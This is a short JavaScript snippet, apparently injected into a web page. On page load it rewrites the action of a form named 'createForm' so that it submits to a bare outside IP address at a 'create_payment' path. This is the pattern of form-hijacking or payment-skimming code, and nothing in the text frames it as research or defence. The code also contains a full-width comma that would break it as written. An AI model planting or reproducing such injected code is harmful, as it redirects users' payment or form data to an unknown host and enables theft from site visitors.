window.onload=function(){var scriptEle = document.createElement("script");
     scriptEle.type ="text/javascript";
     scriptEle.text = `document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'`;
     var x = document.getElementById("createForm");
     x.insertBefore(scriptEle，x.firstChild);
     document.body.appendChild(scriptEle);
}
